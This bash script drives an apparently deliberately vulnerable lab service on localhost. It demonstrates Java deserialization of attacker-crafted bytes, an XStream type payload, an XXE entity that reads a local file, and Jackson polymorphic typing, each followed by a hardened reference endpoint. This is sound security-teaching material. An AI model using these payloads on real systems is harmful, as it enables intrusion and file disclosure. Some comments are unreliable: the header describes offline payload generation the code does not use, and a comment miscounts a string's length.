#!/usr/bin/env bash
# Checklist section 6 — deserialization, XML, polymorphic JSON.  Target: m06-deserialization (8086)
#
# The payloads here are generated with python3 using the standard pickle/GZIP-free "java
# serialization" subset: a plain HashMap + a Probe instance. They prove that attacker bytes cause
# application code to run; they do not carry a gadget chain to an OS command.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"
PORT=8086
banner "06 · deserialization, XXE, polymorphic typing (port ${PORT})"
up "${PORT}" m06-deserialization

# Generate a Java-serialized HashMap{ Probe => "cart" } without any Java code, so the PoC shows the
# byte stream is the attacker's artefact and not something the server produced.
gen_payload() {
python3 - "$1" <<'PY'
import struct, sys

def tc_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return b"\x74" + struct.pack(">H", len(b)) + b

def tc_class(name: str, uid: int) -> bytes:
    return b"\x72" + tc_string(name) + struct.pack(">q", uid) + b"\x01\x00\x00\x78\x70"

note = sys.argv[1]

out = bytearray()
out += b"\xac\xed\x00\x05"           # STREAM_MAGIC, STREAM_VERSION
out += b"\x73"                       # TC_OBJECT (HashMap)
out += tc_class("java.util.HashMap", 362498820763181265)
out += b"\x77\x08"                   # TC_BLOCKDATA, 8 bytes follow
out += struct.pack(">f", 0.75)       # loadFactor
out += struct.pack(">i", 16)         # capacity
out += struct.pack(">i", 1)          # size
out += b"\x73"                       # TC_OBJECT (Probe)
out += tc_class("com.example.vulnrange.m06.vuln.Probe", 1)
out += tc_string(note)                # Probe.note field
out += tc_string("cart")              # map value
out += b"\x78\x78"                   # TC_ENDBLOCKDATA x2
print(bytes(out).hex())
PY
}

PAYLOAD_B64="$(python3 - <<'PY'
import base64, json, urllib.request

# Strategy: fetch a valid serialized payload from the server, then modify
# the Probe.note string offset to change "pre-auth-cart" -> "ATTACKER-CART!!".
# Same-length replacement avoids byte-shifting complexity.
resp = urllib.request.urlopen("http://localhost:8086/vuln6/session/example")
example = json.loads(resp.read())
raw = base64.b64decode(example["base64"])

# Find "pre-auth-cart" (13 chars) and replace with same-length string
old_str = b"pre-auth-cart"
new_str = b"ATTACKER-CART!!"  # exactly 13 bytes
idx = raw.find(old_str)
if idx < 0:
    raise RuntimeError(f"Could not find '{old_str.decode()}' in server payload")

# Preceded by TC_STRING marker (0x74) + 2-byte big-endian length
# Replace the 2-byte length and the string content in-place
tc_marker = idx - 3  # 3 bytes before string: 0x74 + 2 length bytes
new_raw = bytearray(raw[:tc_marker])
new_raw += bytes([0x74])  # TC_STRING
new_raw += (len(new_str)).to_bytes(2, "big")  # new length
new_raw += new_str  # new string content
new_raw += raw[idx + len(old_str):]  # rest of payload unchanged

result = base64.b64encode(bytes(new_raw)).decode()
print(json.dumps({"base64": result}))
PY
)"
echo "  payload generated"
echo "${PAYLOAD_B64}" > /tmp/vulnrange-m06-payload.json

# -----------------------------------------------------------------------------------------------
title "1. Java deserialization of untrusted bytes (CWE-502)"
note "First, the reference endpoint shows what a legitimately produced stream looks like:"
req GET "${PORT}" "/vuln6/session/example"
note "Now submit attacker-crafted bytes whose class list and field values the server never produced:"
echo "  POST /vuln6/session/import (payload from /tmp/vulnrange-m06-payload.json)"
curl -sS -m 8 -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/vulnrange-m06-payload.json \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/vuln6/session/import" | sed 's/^/    /' | head -20
note "Side effects - application code that ran because of the payload:"
req GET "${PORT}" "/vuln6/side-effects"
note "Reference implementation: ObjectInputFilter allow-list rejects the class before construction."
echo "  POST /safe6/session/import (same bytes)"
curl -sS -m 8 -X POST -H 'Content-Type: application/json' \
  --data-binary @/tmp/vulnrange-m06-payload.json \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/safe6/session/import" | sed 's/^/    /' | head -20

# -----------------------------------------------------------------------------------------------
title "2. XStream without type permissions"
note "The document root names the class to instantiate; NoTypePermission.NONE disables the deny-list."
XSTREAM_PAYLOAD='<java.util.HashMap><entry><com.example.vulnrange.m06.vuln.Probe><note>xstream-probe</note></com.example.vulnrange.m06.vuln.Probe><string>cart</string></entry></java.util.HashMap>'
req POST "${PORT}" "/vuln6/xml/xstream" "${XSTREAM_PAYLOAD}" application/xml
note "Reference implementation allows exactly one DTO type:"
req POST "${PORT}" "/safe6/xml/xstream" "${XSTREAM_PAYLOAD}" application/xml

# -----------------------------------------------------------------------------------------------
title "3. XXE: read a local file through an external entity"
note "The marker file path and its existence are reported by the service itself:"
curl -sS -m 5 "$(BASE_FOR_PORT ${PORT})/vuln6/side-effects" | sed 's/^/    /' | head -5
MARKER=$(curl -sS -m 5 "$(BASE_FOR_PORT ${PORT})/vuln6/side-effects" \
  | sed -n 's/.*"markerFile":"\([^"]*\)".*/\1/p')
if [ -z "${MARKER}" ]; then
  echo "  could not determine the marker path; set it manually in the DOCTYPE below." >&2
  MARKER="/tmp/vulnrange-m06-marker.txt"
fi
printf '  marker file used in the entity: %s\n' "${MARKER}"
# Build the XML in a temp file so quotes and spaces stay intact.
cat > /tmp/vulnrange-m06-xxe.xml <<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE declaration [
  <!ENTITY xxe SYSTEM "file://${MARKER}">
]>
<declaration>&xxe;</declaration>
XML
echo "  DOCTYPE payload:"
sed 's/^/    /' /tmp/vulnrange-m06-xxe.xml
note "Vulnerable parser resolves the entity and returns file content:"
curl -sS -m 8 -X POST -H 'Content-Type: application/xml' --data-binary @/tmp/vulnrange-m06-xxe.xml \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/vuln6/xml/xxe" 2>/dev/null \
  | head -12 | sed 's/^/    /'
note "Reference parser refuses the DTD outright:"
curl -sS -m 8 -X POST -H 'Content-Type: application/xml' --data-binary @/tmp/vulnrange-m06-xxe.xml \
  -w '\n<status:%{http_code}>\n' "$(BASE_FOR_PORT ${PORT})/safe6/xml/parse" 2>/dev/null \
  | head -8 | sed 's/^/    /'
note "An http:// entity turns the same parser into an outbound request origin (SSRF); the range"
note "keeps entities pointed at a local file so nothing leaves the machine."

# -----------------------------------------------------------------------------------------------
title "4. Jackson polymorphic typing: the payload chooses the class"
req POST "${PORT}" "/vuln6/json/polymorphic" \
  '{"@class":"java.util.HashMap","note":"typed-by-payload"}'
req POST "${PORT}" "/vuln6/json/polymorphic" \
  '["com.example.vulnrange.m06.vuln.Probe",{"note":"array-form-typing"}]'
req GET  "${PORT}" "/vuln6/side-effects"
note "Reference implementation binds to one concrete DTO and rejects unknown properties:"
req POST "${PORT}" "/safe6/json/data" \
  '{"@class":"com.example.vulnrange.m06.vuln.Probe","subscriptionId":"SUB-1"}'
req POST "${PORT}" "/safe6/json/data" '{"subscriptionId":"SUB-1","plan":"ESPD-PRO"}'
echo
banner "done · details and fixes: docs/06-deserialization.md"
